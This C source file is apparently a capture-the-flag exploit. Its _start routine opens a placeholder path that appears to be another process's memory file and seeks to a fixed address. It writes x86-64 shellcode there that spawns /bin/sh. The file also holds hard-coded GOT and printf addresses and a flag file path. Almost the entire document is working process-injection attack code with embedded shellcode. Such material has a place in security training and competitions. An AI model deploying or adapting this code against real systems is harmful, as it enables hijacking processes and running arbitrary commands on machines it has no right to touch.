#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdint.h>

#define O_WRONLY	00000001
#define MEMCMP_GOT_ADDR (0x4D1078)

long syscall_func(long number, ...);

__attribute__((section(".text"))) const char flag_file_path[] = "/home/user/flag";
__attribute__((section(".text"))) const char child_mem_file[] = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
__attribute__((section(".text"))) const char shellcodep[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";


int _start(void)
{
    int mem_fd = -1;
    uint64_t overwrite = 0x0000000000412E40;    //printf

    mem_fd = syscall_func(__NR_open, child_mem_file, O_WRONLY, 0);
    syscall_func(__NR_lseek, mem_fd, 0x40227C, SEEK_SET);
    syscall_func(__NR_write, mem_fd, shellcodep, sizeof(shellcodep));
    
    while (1)
    {
        ;
    }
    return 0;
}
